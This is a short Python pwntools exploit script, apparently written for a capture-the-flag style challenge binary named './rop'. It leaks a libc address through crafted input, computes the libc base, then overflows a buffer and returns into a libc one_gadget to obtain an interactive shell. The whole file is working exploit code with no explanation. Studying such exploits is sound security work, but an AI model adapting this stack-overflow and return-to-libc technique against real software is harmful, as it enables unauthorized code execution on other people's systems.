#!/usr/bin/python3
 
from pwn import *

vuln = ELF("./rop")
libc = ELF("/usr/lib/libc.so.6")

p = process("./rop")
context.binary = vuln

one_gadgets = [
    0xff2e2,
    0xff2ea,
    0xff2ef
]

p.recvline()

payload = 0x37*b"2" + b"\n"
p.send(payload)
p.recvline()
libc_leak = p.recvline(keepends=False)
libc.address = unpack(libc_leak, 'all') - 0x25c88
info(f"Libc @ {hex(libc.address)}")

#pause()
payload = 0x28*b"A"
payload += p64(libc.address + one_gadgets[2])
p.sendline(payload)


p.interactive()